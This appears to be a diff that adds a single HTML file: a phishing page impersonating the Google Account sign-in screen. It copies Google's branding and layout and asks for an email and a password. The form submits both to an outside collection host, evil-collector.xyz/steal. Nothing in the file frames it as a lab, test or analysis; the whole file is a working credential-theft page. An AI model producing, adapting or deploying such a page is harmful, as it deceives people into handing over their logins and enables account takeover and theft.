@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Account Login</title>
+  <style>
+    body {
+      font-family: 'Roboto', arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      background-color: #f0f4f9;
+    }
+    .card {
+      background: #ffffff;
+      border-radius: 28px;
+      padding: 40px;
+      width: 440px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      text-align: center;
+    }
+    .logo {
+      font-size: 24px;
+      font-weight: 500;
+      color: #1f1f1f;
+      margin-bottom: 16px;
+    }
+    .logo span:nth-child(1) { color: #4285F4; }
+    .logo span:nth-child(2) { color: #EA4335; }
+    .logo span:nth-child(3) { color: #FBBC05; }
+    .logo span:nth-child(4) { color: #4285F4; }
+    .logo span:nth-child(5) { color: #34A853; }
+    .logo span:nth-child(6) { color: #EA4335; }
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      color: #1f1f1f;
+      margin: 0 0 8px;
+    }
+    p {
+      color: #444746;
+      font-size: 14px;
+      margin-bottom: 24px;
+    }
+    .input-group {
+      margin-bottom: 16px;
+      text-align: left;
+    }
+    input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #747775;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    button {
+      background-color: #0b57d0;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-top: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+    <h1>Sign in with Google</h1>
+    <p>to continue to Google Account services</p>
+    <form action="http://evil-collector.xyz/steal" method="POST">
+      <div class="input-group">
+        <input type="text" name="email" placeholder="Email or phone" required>
+      </div>
+      <div class="input-group">
+        <input type="password" name="password" placeholder="Enter your password" required>
+      </div>
+      <button type="submit">Next</button>
+    </form>
+  </div>
+</body>
+</html>
